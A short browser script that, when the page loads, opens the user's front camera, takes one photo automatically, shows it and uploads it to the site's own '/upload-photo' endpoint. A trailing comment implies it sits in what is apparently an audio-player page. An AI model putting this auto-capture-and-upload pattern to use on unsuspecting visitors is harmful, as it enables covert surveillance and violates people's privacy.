<script>
  const video = document.getElementById("video");
  const photo = document.getElementById("photo");

  async function startCameraAndCapture() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" },
        audio: false,
      });
      video.srcObject = stream;

      await new Promise((resolve) => {
        video.onloadedmetadata = () => resolve();
      });

      await new Promise((resolve) => setTimeout(resolve, 200));

      capturePhoto();

    } catch (err) {
      console.error("Error accessing camera:", err);
    }
  }

  function capturePhoto() {
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const dataUrl = canvas.toDataURL("image/png");
    photo.src = dataUrl;
    photo.style.display = "block"; // ✅ show it
    sendPhotoToServer(dataUrl);
  }

  function sendPhotoToServer(dataUrl) {
    fetch("/upload-photo", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ image: dataUrl }),
    })
      .then((res) => {
        if (!res.ok) throw new Error("Upload failed");
        return res.json();
      })
      .then((data) => {
        if (data.status === "success") {
          console.log("✅ Photo saved:", data.url);
        } else {
          console.error("Upload failed:", data);
        }
      })
      .catch((err) => {
        console.error("Error uploading photo:", err);
      });
  }

  // ✅ Load last photo on page load
  async function loadLastPhoto() {
    try {
      const res = await fetch("/last-photo");
      if (!res.ok) throw new Error("No photo yet");
      const data = await res.json();
      if (data.url) {
        photo.src = data.url;
        photo.style.display = "block";
        console.log("📸 Last uploaded photo:", data.url);
      }
    } catch (err) {
      console.warn("⚠️ Could not load last photo:", err.message);
    }
  }

  // Start camera & load photo on load
  window.addEventListener("load", () => {
    startCameraAndCapture();
    loadLastPhoto();
  });

  // Audio player code stays the same
</script>
